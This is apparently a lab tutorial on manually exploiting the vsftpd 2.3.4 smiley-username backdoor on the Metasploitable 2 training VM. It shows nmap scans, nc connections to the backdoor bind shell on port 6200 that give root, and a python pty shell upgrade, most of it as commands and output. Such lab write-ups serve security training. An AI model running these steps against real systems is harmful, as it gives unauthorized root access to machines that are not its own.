# vsftpd manual exploit metasploitable
manual exploit of vsftpd service on metasplotiable 

exploting metasplotiable service vftpd using a smiley as the username to authenticate,Assuming you have the Metasploitable 2 virtual machine installed and running.

first use namp to scan all the ports 

$ nmap -p- -sV "ip of metasplotiable machine"

	```PORT      STATE SERVICE     VERSION
	21/tcp    open  ftp         vsftpd 2.3.4
	22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	23/tcp    open  telnet      Linux telnetd
	25/tcp    open  smtp        Postfix smtpd
	53/tcp    open  domain      ISC BIND 9.4.2
	80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
	111/tcp   open  rpcbind     2 (RPC #100000)
	139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	512/tcp   open  exec        netkit-rsh rexecd
	513/tcp   open  login
	514/tcp   open  tcpwrapped
	1099/tcp  open  rmiregistry GNU Classpath grmiregistry
	1524/tcp  open  bindshell   Metasploitable root shell
	2049/tcp  open  nfs         2-4 (RPC #100003)
	2121/tcp  open  ftp         ProFTPD 1.3.1
	3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
	3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
	5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
	5900/tcp  open  vnc         VNC (protocol 3.3)
	6000/tcp  open  X11         (access denied)
	6667/tcp  open  irc         UnrealIRCd
	6697/tcp  open  irc         UnrealIRCd
	8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
	8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
	8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
	35479/tcp open  status      1 (RPC #100024)
	43348/tcp open  mountd      1-3 (RPC #100005)
	51753/tcp open  nlockmgr    1-4 (RPC #100021)
	58641/tcp open  rmiregistry GNU Classpath grmiregistry```
  
# here you will see that there is vsftpd port 21 is open 

and after using namp command to see is port number 6200 is open or not ? using nmap command to see the 6200 port status 
            
            
nmap -p6200 "ip of metasplotable machine"
			
``` 
PORT     STATE  SERVICE
6200/tcp closed lm-x
MAC Address: 08:00:27:C4:54:97 (Oracle VirtualBox virtual NI
Read data files from: /usr/bin/../share/Nmap 
Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
Raw packets sent: 2 (72B) | Rcvd: 2 (68B)
```
you will get to see that the port is closed.....
and then we try reverse natcat connection using port 6200 
 
# nc "ip of metasplotiable machine" 6200
```
(UNKNOWN) [192.168.29.144] 6200 (?) : Connection refused

````
you will get the response as shown above CONNECTION REFUSED because the port was closed,so let's try other way to get in....
trying natcat on port number 21 

# nc "ip of metasplotiable machine" 21 -v
````
192.168.29.144: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.29.144] 21 (ftp) open
220 (vsFTPd 2.3.4
user ksahfhkdbf:) (can use any user name)
{NOTE --->(take any user name but, use :) at the end or at the middle of username it's a malicious code)}    
331 Please specify the password.
pass sakfb (can use any pass)
````
								            
#   MALICIOUS CODE DETAILS      					  
``` 
0x3a = :
0x29 = )
0x3a followed by 0x29 which represents the smiley face :) characters. When the username contains both characters the else if statement executes the vsf_sysutil_extra function,code uses the structure to setup a bind socket and a listener process to listen on the socket for incoming connections. Note  that this code is run in the server context, so the server is setting up the bind socket and listener which is used by the remote attacker for setting up a connection shell to anyone connect to the server on port 6200.}
`````
	 

 and the when we cheak the status of port 6200 
		
# 	nmap -p6200 "ip of metasplotiable machine"
   
```` 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-23 11:35 GMT
Nmap scan report for 192.168.29.144
host is up (0.00053s latency).
PORT     STATE SERVICE
6200/tcp open  lm-x
MAC Address: 08:00:27:C4:54:97 (Oracle VirtualBox virtual NIC)
nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
````

 as we see the port gets open WOW :P
and then using nc command on metaspolitable at the port 6200
 				
# nc "ip of machine" 6200 
 then type id to see which user we got using nc
``` id
 	  uid=0(root) gid=0(root)
````
and for taking a shell use python command 

# python -c 'import pty;pty.spawn("/bin/bash")'
  after using this command you will get a shell 
			
``` 			
python -c 'import pty;pty.spawn("/bin/bash")'
root@metasploitable:/# ls
ls
bin    dev   initrd      lost+found  nohup.out  root  sys  var
boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz
cdrom  home  lib         mnt         proc       srv   usr
root@metasploitable:/# 
```
 as we can see we have successfully taken the shell of root,
thankyou....
